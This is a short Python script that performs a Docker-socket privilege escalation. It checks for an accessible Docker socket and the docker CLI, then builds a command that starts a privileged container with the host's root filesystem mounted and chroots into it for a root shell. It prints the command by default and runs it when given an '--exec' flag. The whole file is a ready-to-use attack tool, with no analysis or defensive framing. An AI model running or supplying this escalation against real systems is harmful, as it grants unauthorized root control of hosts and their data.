#!/usr/bin/env python3
import os
import subprocess
import sys

def main():
    docker_sock = os.environ.get("DOCKER_SOCK", "/var/run/docker.sock")
    image = sys.argv[1] if len(sys.argv) > 1 else "alpine"
    do_exec = "--exec" in sys.argv

    if not os.path.exists(docker_sock):
        print(f"[-] Docker socket not found at {docker_sock}")
        return

    if subprocess.call(["which", "docker"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) != 0:
        print("[-] Docker CLI not found in PATH.")
        return

    cmd = [
        "docker", "run", "--rm", "-it", "--privileged",
        "-v", "/:/host", image,
        "chroot", "/host", "/bin/sh"
    ]

    if do_exec:
        print("[+] Executing command:")
        print(" ".join(cmd))
        subprocess.call(cmd)
    else:
        print("[+] Docker socket is accessible.")
        print("[+] Would execute:")
        print("    " + " ".join(cmd))
        print("    Add '--exec' as an argument to actually run it.")

if __name__ == "__main__":
    main()
